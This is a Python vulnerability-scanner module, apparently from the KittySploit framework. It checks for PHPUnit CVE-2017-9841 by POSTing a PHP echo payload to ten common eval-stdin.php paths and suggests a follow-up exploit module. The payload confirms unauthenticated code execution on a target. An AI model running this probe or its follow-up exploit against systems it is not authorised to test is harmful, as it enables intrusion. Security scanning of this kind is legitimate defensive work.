#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHPUnit eval-stdin.php unauthenticated RCE (CVE-2017-9841)."""

import base64

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPUnit - eval-stdin.php RCE Detection (CVE-2017-9841)',
        'description': (
            'Detects CVE-2017-9841 by POSTing PHP to vendor phpunit Util/PHP/eval-stdin.php '
            'and checking for reflected echo output.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2017', 'phpunit', 'rce', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/multi/http/phpunit_cve_2017_9841_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2017-9841',
        ],
        'cve': 'CVE-2017-9841',
    }

    PATHS = (
        '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php',
        '/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/phpunit/src/Util/PHP/eval-stdin.php',
        '/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/vendor/phpunit/src/Util/PHP/eval-stdin.php',
        '/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
        '/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
    )

    def run(self):
        token = 'KS' + self.random_text(10)
        payload = '<?php echo(base64_decode("' + base64.b64encode(token.encode()).decode() + '")); ?>'
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Accept': '*/*'}
        for path in self.PATHS:
            r = self.http_request(
                method='POST', path=path, data=payload, headers=headers, allow_redirects=False,
            )
            if r and token in (r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='PHPUnit eval-stdin.php RCE (CVE-2017-9841)',
                    path=path,
                )
                return True
        return False
